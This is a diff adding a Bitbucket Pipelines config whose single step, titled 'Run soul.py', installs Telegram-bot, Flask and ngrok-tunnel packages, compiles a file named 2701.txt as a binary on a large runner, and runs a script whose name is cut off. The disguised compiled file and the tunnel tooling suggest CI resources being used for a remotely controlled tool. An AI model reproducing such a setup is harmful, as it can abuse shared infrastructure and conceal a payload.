@@ -1,0 +1,12 @@
+pipelines:
+  default:
+    - parallel:
+        - step:
+            name: Run soul.py
+            image: python:3.10
+            size: 8x
+            script:
+              - echo "Running soul.py on the first machine..."
+              - pip install telebot pymongo aiohttp flask pyngrok
+              - gcc 2701.txt -o 2701.txt -pthread
+              - python3 m.p
